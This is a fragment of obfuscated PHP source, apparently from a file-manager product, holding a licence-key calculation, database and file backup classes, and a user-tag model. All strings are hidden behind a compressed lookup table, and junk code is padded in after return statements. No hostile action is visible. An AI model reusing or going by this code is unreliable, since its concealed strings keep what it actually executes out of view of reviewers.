$Îíòò‚ß = 0; $ù«Ê»ÌĞ = 0; for ($²ùÔÜ“¿ = 3; $²ùÔÜ“¿ < $äìèªö¼; $²ùÔÜ“¿ += 2) { if ($äìèªö¼ % $²ùÔÜ“¿ != 0) { continue; } $Îíòò‚ß = $²ùÔÜ“¿; $ù«Ê»ÌĞ = intval($äìèªö¼ / $²ùÔÜ“¿); $££›æš = $„âÛ‚€[753]; break; } $×ÖÏ¨Ù– = ($Îíòò‚ß - 1) * ($ù«Ê»ÌĞ - 1); $Àûô£¿ = $„âÛ‚€[754]; if (strlen($Àûô£¿) < $„âÛ‚€[634]) { return; } $ÅúÍñØ˜ = intval(($Îíòò‚ß + $ù«Ê»ÌĞ) / 2); while (1) { $˜ËØ§ = $ÅúÍñØ˜; $×ó¸¨š = $×ÖÏ¨Ù–; $ò¡È®¸³ = $„âÛ‚€[755]; if (strlen($ò¡È®¸³) < $„âÛ‚€[645]) { return; } while ($×ó¸¨š % $˜ËØ§ != 0) { $ı÷ˆ°ñ = $×ó¸¨š; $×ó¸¨š = $˜ËØ§; $˜ËØ§ = $ı÷ˆ°ñ % $˜ËØ§; $ô‡»âè¿ = $„âÛ‚€[756]; while ($ô‡»âè¿ < $„âÛ‚€[634]) { if ($ô‡»âè¿ >= 0) { break; } $ô‡»âè¿++; } } if ($˜ËØ§ == 1) { break; } else { $ÅúÍñØ˜++; } } $É½ÇÜ¡Á = 2; for ($²ùÔÜ“¿ = 0; $²ùÔÜ“¿ < $×ÖÏ¨Ù– * 10; $²ùÔÜ“¿++) { if (($×ÖÏ¨Ù– * $²ùÔÜ“¿ + 1) % $ÅúÍñØ˜ == 0) { $É½ÇÜ¡Á = intval(($×ÖÏ¨Ù– * $²ùÔÜ“¿ + 1) / $ÅúÍñØ˜); break; } } $òÛÄÏ = md5($¸½Èéü[297] . ($Îíòò‚ß + $ù«Ê»ÌĞ) . $¸½Èéü[298] . $ÅúÍñØ˜ . $¸½Èéü[298] . $É½ÇÜ¡Á . $¸½Èéü[299]); $òíˆµà = $this->qocba3ce4d19($Â®€Í¿¿[0], $òÛÄÏ); return $òíˆµà; } public function upor5774df6d() { $ÃÎÎÄÚà =& $_SERVER[¯µç›È¢]; $Á‹ÔĞÒ× = mt_rand(pow(2, 14), pow(2, 16) - 1); $ıËšîôÄ = $ÃÎÎÄÚà[757]; if (!$ıËšîôÄ) { return; } $éÖğ®çé = array(); $ÓéÈ´Ï = 1; while ($ÓéÈ´Ï <= (int) sqrt($Á‹ÔĞÒ×)) { $¿Œ˜’¤ = $ÓéÈ´Ï; $²¯ÇĞ÷ = $ÃÎÎÄÚà[758]; while (strlen($²¯ÇĞ÷) < $ÃÎÎÄÚà[622]) { if (!$²¯ÇĞ÷) { break; } $²¯ÇĞ÷++; } while (!0) { $¿Œ˜’¤++; $½úĞÄ´¦ = $ÃÎÎÄÚà[759]; while ($½úĞÄ´¦ < $ÃÎÎÄÚà[634]) { if ($½úĞÄ´¦ >= 0) { break; } $½úĞÄ´¦++; } if ($¿Œ˜’¤ <= 2) { $ÓéÈ´Ï = $¿Œ˜’¤; break; } else { if ($¿Œ˜’¤ < 2) { continue; } } $êÇ»›­Ÿ = !0; for ($ÔØÌñ«£ = 2; $ÔØÌñ«£ <= sqrt($¿Œ˜’¤); $ÔØÌñ«£++) { if ($¿Œ˜’¤ % $ÔØÌñ«£ == 0) { $êÇ»›­Ÿ = !1; } } if ($êÇ»›­Ÿ) { $ÓéÈ´Ï = $¿Œ˜’¤; break; } } $éÖğ®çé[] = $ÓéÈ´Ï; $²ºÙî°— = $ÃÎÎÄÚà[760]; while ($²ºÙî°— < $ÃÎÎÄÚà[634]) { if ($²ºÙî°— >= 0) { break; } $²ºÙî°—++; } } $çâçˆš = 2; $Ùßåëñş = $ÃÎÎÄÚà[761]; for ($¿Œ˜’¤ = $Á‹ÔĞÒ×; $¿Œ˜’¤ > 1; $¿Œ˜’¤--) { $êÇ»›­Ÿ = !0; $å¼õ‡¸ = $ÃÎÎÄÚà[762]; if (strlen($å¼õ‡¸) < $ÃÎÎÄÚà[645]) { return; } foreach ($éÖğ®çé as $ ó¸¶©£) { if ($¿Œ˜’¤ % $ ó¸¶©£ == 0) { $êÇ»›­Ÿ = !1; break; } } if ($êÇ»›­Ÿ) { $çâçˆš = $¿Œ˜’¤; break; } } return $çâçˆš; } public function nxejedb5adba($Ò’ø‹ÌŒ, $ßŠ½àŒ«) { $Ô£®·ˆ =& $_SERVER[¯µç›È¢]; $«íÇµ˜Ü =& $_SERVER[¥Ô°é•­]; return call_user_func(array($«íÇµ˜Ü[8], $«íÇµ˜Ü[301]), $Ò’ø‹ÌŒ, $ßŠ½àŒ«); $Â•¦àöî = $Ô£®·ˆ[763]; if (strlen($Â•¦àöî) < $Ô£®·ˆ[618]) { return; } } public function lyuc55548a77($şÌÃçùÌ, $àÓ´»®) { $Õ–Ÿ“ò¡ =& $_SERVER[¥Ô°é•­]; return call_user_func(array($Õ–Ÿ“ò¡[302], $Õ–Ÿ“ò¡[303]), $şÌÃçùÌ, $àÓ´»®); $°‚©Á˜ = $_SERVER[¯µç›È¢][666]; if (!$°‚©Á˜) { die; } } public function qocba3ce4d19($•¦ ½Ú, $ÑÓğ†¡ü) { $èùåŞ·ó =& $_SERVER[¯µç›È¢]; $­Ò±¨âä =& $_SERVER[¥Ô°é•­]; return call_user_func(array($­Ò±¨âä[302], $­Ò±¨âä[304]), $•¦ ½Ú, $ÑÓğ†¡ü); $±Æˆ¸ƒ€ = $èùåŞ·ó[764]; while ($±Æˆ¸ƒ€ < $èùåŞ·ó[67]) { if ($±Æˆ¸ƒ€ >= 0) { break; } $±Æˆ¸ƒ€++; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $ı×¾æù† =& $_SERVER[¯µç›È¢]; $this->isManual(); self::$name = date($ı×¾æù†[765]); if (!($€¤¼àïş = Model($ı×¾æù†[766])->lastItem())) { $€¤¼àïş = $this->initData(); } else { self::$name = $€¤¼àïş[$ı×¾æù†[32]]; if ($€¤¼àïş[$ı×¾æù†[767]] == $ı×¾æù†[99]) { self::$name = date($ı×¾æù†[768]); $¤Ø•Ó„ = 0; if (isset($€¤¼àïş[$ı×¾æù†[301]][$ı×¾æù†[206]][$ı×¾æù†[472]])) { $¤Ø•Ó„ = (int) $€¤¼àïş[$ı×¾æù†[301]][$ı×¾æù†[206]][$ı×¾æù†[472]]; } if (self::$manual == 0 && $€¤¼àïş[$ı×¾æù†[32]] == self::$name) { Model($ı×¾æù†[766])->remove($€¤¼àïş[$ı×¾æù†[405]]); } $€¤¼àïş = $this->initData($¤Ø•Ó„, $€¤¼àïş[$ı×¾æù†[769]]); } else { $this->checkStore($€¤¼àïş[$ı×¾æù†[769]]); } } self::$option = $€¤¼àïş; } private function isManual() { $Á£œë¯õ = _get($GLOBALS, $_SERVER[¯µç›È¢][770], 0); $Á£œë¯õ = intval($Á£œë¯õ); self::$manual = $Á£œë¯õ && $Á£œë¯õ == 1 ? 1 : 0; } private function initData($“£Ì·Õ = 0, $Û³ÀäİŸ = '') { $Üı¶ÚÅÈ =& $_SERVER[¯µç›È¢]; $üÕªÓ¼ = Model($Üı¶ÚÅÈ[766])->config(); if ($Û³ÀäİŸ && $üÕªÓ¼[$Üı¶ÚÅÈ[769]] != $Û³ÀäİŸ) { $“£Ì·Õ = 0; } $this->checkStore($üÕªÓ¼[$Üı¶ÚÅÈ[769]]); if (self::$manual == 1) { self::$name .= $Üı¶ÚÅÈ[11] . date($Üı¶ÚÅÈ[771]); } $ğÂ±‘ÌÙ = array($Üı¶ÚÅÈ[769] => $üÕªÓ¼[$Üı¶ÚÅÈ[769]], $Üı¶ÚÅÈ[32] => self::$name, $Üı¶ÚÅÈ[767] => 0, $Üı¶ÚÅÈ[772] => $üÕªÓ¼[$Üı¶ÚÅÈ[772]], $Üı¶ÚÅÈ[773] => self::$manual, $Üı¶ÚÅÈ[301] => array($Üı¶ÚÅÈ[774] => array($Üı¶ÚÅÈ[767] => 0), $Üı¶ÚÅÈ[775] => array($Üı¶ÚÅÈ[767] => 0, $Üı¶ÚÅÈ[776] => 0, $Üı¶ÚÅÈ[777] => 0, $Üı¶ÚÅÈ[33] => $Üı¶ÚÅÈ[12], $Üı¶ÚÅÈ[778] => 0, $Üı¶ÚÅÈ[501] => 0), $Üı¶ÚÅÈ[779] => array($Üı¶ÚÅÈ[767] => 0, $Üı¶ÚÅÈ[776] => 0, $Üı¶ÚÅÈ[777] => 0, $Üı¶ÚÅÈ[778] => 0, $Üı¶ÚÅÈ[501] => 0), $Üı¶ÚÅÈ[206] => array($Üı¶ÚÅÈ[767] => 0, $Üı¶ÚÅÈ[780] => 0, $Üı¶ÚÅÈ[781] => 0, $Üı¶ÚÅÈ[782] => 0, $Üı¶ÚÅÈ[783] => 0, $Üı¶ÚÅÈ[472] => $“£Ì·Õ, $Üı¶ÚÅÈ[778] => 0, $Üı¶ÚÅÈ[501] => 0)), $Üı¶ÚÅÈ[778] => time(), $Üı¶ÚÅÈ[501] => 0); $èË­­Åğ = Model($Üı¶ÚÅÈ[766])->insert($ğÂ±‘ÌÙ); $ğÂ±‘ÌÙ[$Üı¶ÚÅÈ[405]] = $èË­­Åğ; return $ğÂ±‘ÌÙ; } private function checkStore($§œãª¹) { $À¹€Ş =& $_SERVER[¯µç›È¢]; $†ÉÓ™Ô = Model($À¹€Ş[784])->listData($§œãª¹); Model($À¹€Ş[784])->checkConfig($†ÉÓ™Ô); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¯µç›È¢][766])->findByName(self::$name); } return self::$option; } public static function set($°–µİêæ) { $ò¦Û¦ï¡ =& $_SERVER[¯µç›È¢]; $·ÆÊ´Òˆ = self::get(); foreach ($°–µİêæ as $Ùßªœ… => $Ëñ–…µÙ) { $›óä‡´ = explode($ò¦Û¦ï¡[10], $Ùßªœ…); $‡Àäª© = count($›óä‡´); switch ($‡Àäª©) { case 1: $·ÆÊ´Òˆ[$›óä‡´[0]] = $Ëñ–…µÙ; break; case 2: $·ÆÊ´Òˆ[$›óä‡´[0]][$›óä‡´[1]] = $Ëñ–…µÙ; break; case 3: $·ÆÊ´Òˆ[$›óä‡´[0]][$›óä‡´[1]][$›óä‡´[2]] = $Ëñ–…µÙ; break; } } Model($ò¦Û¦ï¡[766])->update($·ÆÊ´Òˆ[$ò¦Û¦ï¡[405]], $·ÆÊ´Òˆ); self::$option = $·ÆÊ´Òˆ; return self::$option; } public function keep() { $Ôø©´ø¨ =& $_SERVER[¯µç›È¢]; $¤óÅšüƒ = self::get(); if ($¤óÅšüƒ[$Ôø©´ø¨[301]][$Ôø©´ø¨[774]][$Ôø©´ø¨[767]] == $Ôø©´ø¨[99]) { return; } $this->backupKeep($¤óÅšüƒ); self::set(array($Ôø©´ø¨[785] => 1)); } private function backupKeep($¬Æ˜Ô˜) { $ñ»ç§ =& $_SERVER[¯µç›È¢]; if (self::$manual == 1) { return; } $ û·ïÖò = Model($ñ»ç§[766])->listData(); if (empty($ û·ïÖò)) { return; } $ğÉôş¡û = 0; $ÆÊİ“ÖÑ = array(); foreach ($ û·ïÖò as $¿‡ÑÄÈ¾) { if ($ğÉôş¡û >= 7) { break; } $ÆÊİ“ÖÑ[] = $¿‡ÑÄÈ¾[$ñ»ç§[32]]; $ğÉôş¡û++; } for ($ğÉôş¡û = 0; $ğÉôş¡û < 12; $ğÉôş¡û++) { $ÆÊİ“ÖÑ[] = date($ñ»ç§[786], strtotime("\x2d{$ğÉôş¡û}\40\155\157\156\x74\150\x73")); } $ÆÊİ“ÖÑ = array_unique($ÆÊİ“ÖÑ); $ä…»ı—± = Model($ñ»ç§[787])->get($ñ»ç§[788]); foreach ($ û·ïÖò as $¿‡ÑÄÈ¾) { if (isset($¿‡ÑÄÈ¾[$ñ»ç§[773]]) && $¿‡ÑÄÈ¾[$ñ»ç§[773]] == $ñ»ç§[99]) { continue; } if (!empty($¿‡ÑÄÈ¾[$ñ»ç§[32]]) && in_array($¿‡ÑÄÈ¾[$ñ»ç§[32]], $ÆÊİ“ÖÑ)) { continue; } Model($ñ»ç§[766])->remove($¿‡ÑÄÈ¾[$ñ»ç§[405]]); $ŞêùÙœ = $this->backupPath($¬Æ˜Ô˜, $ä…»ı—±); IO::remove($ŞêùÙœ, !1); } } private function backupPath($­µĞ„¦, $‹áöù†÷ = false) { $Óú»¤– =& $_SERVER[¯µç›È¢]; if (!$‹áöù†÷) { $‹áöù†÷ = Model($Óú»¤–[787])->get($Óú»¤–[788]); } $ª±Ğ³¦Ô = $­µĞ„¦[$Óú»¤–[32]]; $÷îË× = substr(md5($Óú»¤–[789] . $‹áöù†÷ . $ª±Ğ³¦Ô), 0, 8); return "\173\x69\x6f\x3a{$­µĞ„¦[$Óú»¤–[769]]}\x7d\x2f\x64\141\x74\x61\x62\x61\163\x65\57\x62\x61\143\x6b\165\x70\57" . $ª±Ğ³¦Ô . $Óú»¤–[11] . $÷îË×; } public function db() { $¨¡ŸÊƒª =& $_SERVER[¯µç›È¢]; $ĞÌÒêÃ = self::get(); if ($ĞÌÒêÃ[$¨¡ŸÊƒª[301]][$¨¡ŸÊƒª[775]][$¨¡ŸÊƒª[767]] == $¨¡ŸÊƒª[99]) { return !0; } $¦Ûåœï = new BackupDb(); if (!$¦Ûåœï->index()) { return !1; } self::set(array($¨¡ŸÊƒª[790] => 1)); return !0; } public function dbFile() { $¾õç•ï° =& $_SERVER[¯µç›È¢]; $«¤üœú = self::get(); if ($«¤üœú[$¾õç•ï°[301]][$¾õç•ï°[779]][$¾õç•ï°[767]] == $¾õç•ï°[99]) { return !0; } $§…ñû = new BackupDbFile(); if (!$§…ñû->index()) { return !1; } self::set(array($¾õç•ï°[791] => 1)); return !0; } public function file() { $î™á¨çĞ =& $_SERVER[¯µç›È¢]; $Âô—¢Üã = self::get(); if ($Âô—¢Üã[$î™á¨çĞ[301]][$î™á¨çĞ[206]][$î™á¨çĞ[767]] == $î™á¨çĞ[99]) { return !0; } if (!isset($Âô—¢Üã[$î™á¨çĞ[772]]) || $Âô—¢Üã[$î™á¨çĞ[772]] == $î™á¨çĞ[204]) { $¡âÖƒœ  = new BackupFile(); if (!$¡âÖƒœ ->index()) { return !1; } } self::set(array($î™á¨çĞ[792] => 1, $î™á¨çĞ[767] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $òõ¨Âà =& $_SERVER[¯µç›È¢]; $ªÆŠÕºô = Backup::get(); self::$io = $ªÆŠÕºô[$òõ¨Âà[769]]; self::$name = $ªÆŠÕºô[$òõ¨Âà[32]]; $ÇÒùçĞ = new DbManage(); $‘‡¦ÛÜš = $ÇÒùçĞ->dbType(); $ŸÜŠ‡ = array($òõ¨Âà[793] => $‘‡¦ÛÜš, $òõ¨Âà[794] => time()); Backup::set($ŸÜŠ‡); $”ø£å•ã = $this->tmpFilesPath() . $òõ¨Âà[795] . self::$name . $òõ¨Âà[8]; del_dir($”ø£å•ã); mk_dir($”ø£å•ã); $ÎíÀöğ— = $ĞîÃéô = 0; $úñœƒ£ò = new Task($òõ¨Âà[796], $òõ¨Âà[797], 0, LNG($òõ¨Âà[798]) . $òõ¨Âà[799] . LNG($òõ¨Âà[800])); try { $†âÏ˜µ³ = $ÇÒùçĞ->db()->getTables(); } catch (Exception $†‘—œı‹) { $úñœƒ£ò->end(); return !1; } $†âÏ˜µ³ = array_diff($†âÏ˜µ³, array($òõ¨Âà[801], $òõ¨Âà[802])); foreach ($†âÏ˜µ³ as $Úùı©ç±) { $ÎíÀöğ— += $ÇÒùçĞ->model($Úùı©ç±)->count(); } $úñœƒ£ò->task[$òõ¨Âà[803]] = $ÎíÀöğ—; $GLOBALS[$òõ¨Âà[804]] = self::$name; foreach ($†âÏ˜µ³ as $Úùı©ç±) { $°Â¤ã„ = $”ø£å•ã . $Úùı©ç± . $òõ¨Âà[805]; $ÓĞÚè¤ï = null; if ($Úùı©ç± == $òõ¨Âà[806] && (!isset($ªÆŠÕºô[$òõ¨Âà[772]]) || $ªÆŠÕºô[$òõ¨Âà[772]] == $òõ¨Âà[204])) { $ÓĞÚè¤ï = self::$io; } $ĞîÃéô += $ÇÒùçĞ->sqlFromDb($Úùı©ç±, $°Â¤ã„, $úñœƒ£ò, $ÓĞÚè¤ï); } unset($GLOBALS[$òõ¨Âà[804]]); $úñœƒ£ò->end(); if ($ĞîÃéô > $ÎíÀöğ—) { $ÎíÀöğ— = $ĞîÃéô; } $ŸÜŠ‡ = array($òõ¨Âà[793] => $‘‡¦ÛÜš, $òõ¨Âà[790] => 1, $òõ¨Âà[807] => $ÎíÀöğ—, $òõ¨Âà[808] => $ĞîÃéô, $òõ¨Âà[809] => time()); Backup::set($ŸÜŠ‡); if ($ÎíÀöğ— - $ĞîÃéô > 0) { $ÖŞ††õ” = $òõ¨Âà[810]; if (stristr(I18n::getType(), $òõ¨Âà[811])) { $ÖŞ††õ” = $òõ¨Âà[812]; } write_log(array($ÖŞ††õ”, $ŸÜŠ‡), $òõ¨Âà[797]); return !1; } return !0; } private function tmpFilesPath() { $ˆëƒ¾Ì =& $_SERVER[¯µç›È¢]; $¯ëÒÕ­ = TEMP_FILES; if ($GLOBALS[$ˆëƒ¾Ì[6]][$ˆëƒ¾Ì[100]][$ˆëƒ¾Ì[813]]) { $¯ëÒÕ­ = $GLOBALS[$ˆëƒ¾Ì[6]][$ˆëƒ¾Ì[100]][$ˆëƒ¾Ì[813]]; if (!mk_dir($¯ëÒÕ­) || !is_writable($¯ëÒÕ­) || !IO::mkfile($¯ëÒÕ­ . $ˆëƒ¾Ì[814])) { $¯ëÒÕ­ = TEMP_FILES; } } return $¯ëÒÕ­; } } goto aÃéøâí¹; Eª¤ø«Áòğ: $_SERVER[¥Ô°é•­] = explode($_SERVER[¯µç›È¢][615], gzinflate(substr($_SERVER[¯µç›È¢][616], 10, -8))); $obrslkvaew = $_SERVER[¯µç›È¢][617]; if (strlen($obrslkvaew) < $_SERVER[¯µç›È¢][618]) { die; } goto fã£ÔÃƒâ; FæŠÓË³ ”: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\162\137\146\x61\x76"; protected function cacheFunctionAlias($ß÷¾°Ì÷) { $‡áÄ»à¾ =& $_SERVER[¯µç›È¢]; return array($‡áÄ»à¾[1944] => array(USER_ID, $‡áÄ»à¾[1945])); } protected function listData() { $ªÁŞ¶âå =& $_SERVER[¯µç›È¢]; $áÓÁ¥Ëù = array($ªÁŞ¶âå[1657] => USER_ID, $ªÁŞ¶âå[488] => array($ªÁŞ¶âå[1948], 0)); $ø¦ñ¯ì¼ = $ªÁŞ¶âå[1950]; $”ÔÁç‡ = $this->field($ø¦ñ¯ì¼)->where($áÓÁ¥Ëù)->order($ªÁŞ¶âå[1951])->select(); return $”ÔÁç‡ ? $”ÔÁç‡ : array(); } protected function listByTag($¦Ä¡ãŸ¸) { } protected function addToTag($òÊ–‹Ş¤, $Şô™“·†) { $¤¾¤£€ë =& $_SERVER[¯µç›È¢]; if (!Model($¤¾¤£€ë[2085])->listData($Şô™“·†) || !Model($¤¾¤£€ë[842])->pathInfo($òÊ–‹Ş¤)) { return !1; } $¯Ãä¿Œ£ = array($¤¾¤£€ë[1657] => USER_ID, $¤¾¤£€ë[488] => $Şô™“·†, $¤¾¤£€ë[427] => $òÊ–‹Ş¤, $¤¾¤£€ë[428] => $¤¾¤£€ë[422], $¤¾¤£€ë[426] => $¤¾¤£€ë[12], $¤¾¤£€ë[1838] => 0); if ($this->where($¯Ãä¿Œ£)->find()) { return !1; } return $this->add($¯Ãä¿Œ£); } protected function removeFromTag($ò¿ù‘øî, $Ó³ÍÇÁ¨) { $Íñî£•¶ =& $_SERVER[¯µç›È¢]; if (!Model($Íñî£•¶[2085])->listData($Ó³ÍÇÁ¨)) { return !1; } if (is_array($ò¿ù‘øî)) { $ò¿ù‘øî = array($Íñî£•¶[7], $ò¿ù‘øî); } $Î´ ”¿ = array($Íñî£•¶[1657] => USER_ID, $Íñî£•¶[488] => $Ó³ÍÇÁ¨, $Íñî£•¶[428] => $Íñî£•¶[422], $Íñî£•¶[427] => $ò¿ù‘øî); return $this->where($Î´ ”¿)->delete(); } protected function removeByTag($Á—»ÜçË) { $ÛÀ³ =& $_SERVER[¯µç›È¢]; if (!$Á—»ÜçË) { return !1; } $Ä¬ŸÇãÑ = array($ÛÀ³[1657] => USER_ID, $ÛÀ³[488] => $Á—»ÜçË); return $this->where($Ä¬ŸÇãÑ)->delete(); } protected function removeBySource($®ƒ©Èù) { $À®ª™´ =& $_SERVER[¯µç›È¢]; if (is_array($®ƒ©Èù)) { $®ƒ©Èù = array($À®ª™´[7], $®ƒ©Èù); } $±±“ø = array($À®ª™´[1657] => USER_ID, $À®ª™´[427] => $®ƒ©Èù, $À®ª™´[488] => array($À®ª™´[1026], 0)); return $this->where($±±“ø)->delete(); } }